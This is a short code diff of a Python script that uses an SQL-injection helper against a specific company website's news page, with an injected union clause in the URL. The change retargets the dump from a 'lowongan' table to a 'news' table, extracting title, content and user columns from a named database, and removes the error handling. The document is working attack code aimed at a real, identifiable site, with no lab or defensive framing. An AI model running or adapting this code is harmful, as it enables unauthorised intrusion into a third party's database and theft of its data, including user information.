@@ -4,8 +4,8 @@ SqliHelper = Sqli("https://www.kabelindo.co.id/readnews.php?id=28%20and%200%20un
 
 informations = SqliHelper.information()
 # print(informations)
-try:
-    dump_data = SqliHelper.dump_data(tables='lowongan',columns=['kdlow','tanggal'],database='u9897uwx_kabel')
-    print(dump_data)
-except Exception as identifier:
-    print(identifier)
+# try:
+dump_data = SqliHelper.dump_data(tables='news',columns=['judul','isi','user'],database='u9897uwx_kabel')
+print(dump_data)
+# except Exception as identifier:
+#     print(identifier)
